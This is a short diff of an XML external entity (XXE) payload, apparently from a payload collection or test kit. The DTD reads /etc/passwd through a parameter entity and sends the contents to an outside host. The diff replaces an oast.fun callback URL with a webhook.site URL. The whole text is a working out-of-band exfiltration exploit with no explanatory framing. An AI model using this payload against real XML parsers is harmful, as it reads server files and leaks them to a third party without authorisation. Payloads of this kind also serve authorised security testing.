@@ -1,5 +1,5 @@
 <!ELEMENT r ANY>
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM &#x27;http://xvnyqipgwmeorfbmijcqc9ssxz948o0sq.oast.fun/?%file;&#x27;>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM &#x27;http://webhook.site/6e53e15d-268a-4d9e-9e1d-3f57b2726c64/?%file;&#x27;>">
 %eval;
 %exfil;
